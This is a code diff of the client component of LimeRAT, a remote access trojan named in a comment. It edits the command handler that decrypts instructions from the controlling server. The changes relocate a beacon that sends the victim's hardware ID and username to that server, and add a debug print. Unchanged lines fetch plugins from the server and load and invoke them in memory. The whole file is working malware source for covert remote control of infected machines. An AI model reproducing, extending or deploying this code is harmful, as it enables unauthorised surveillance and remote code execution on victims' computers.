@@ -2,9 +2,11 @@
 
     Public Class C_Commands
 
-        Private Shared ReadOnly SPL = C_Settings.SPL
+        Private Shared SPL = C_Settings.SPL
 
         Public Shared Sub Data(ByVal b As Byte())
+            Try : C_TcpClient.Send("OK" + SPL + C_ID.HWID + SPL + C_ID.UserName) : Catch : End Try
+            Threading.Thread.Sleep(50)
             Dim EN As String = C_Encryption.AES_Decrypt(BS(b))
             Dim A As String() = Split(EN, SPL)
 
@@ -42,6 +44,7 @@
 
                     Case "CPL" 'check if plugin in installed, or ask server to send it
                         If GTV(A(1)) = Nothing Then
+                            Console.WriteLine(A(1))
                             C_TcpClient.Send("GPL" + SPL + A(1))
                         Else
                             Plugin(GZip(Convert.FromBase64String(GTV(A(1))), False))
@@ -64,8 +67,6 @@
         'Also if you update this method you have to use old LimeRAT to update your clients.
         Public Shared Sub Plugin(ByVal B() As Byte, Optional CMD As String = Nothing)
             Try
-                C_TcpClient.Send("OK" + SPL + C_ID.HWID + SPL + C_ID.UserName)
-
                 For Each Type_ As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                     For Each GM In Type_.GetMethods
                         If GM.Name = "CN" Then
@@ -78,7 +79,6 @@
                     Next
                 Next
             Catch ex As Exception
-                C_TcpClient.Send("OK" + SPL + C_ID.HWID + SPL + C_ID.UserName)
                 C_TcpClient.Send("MSG" + SPL + "Plugin Error! " + ex.Message)
             End Try
         End Sub
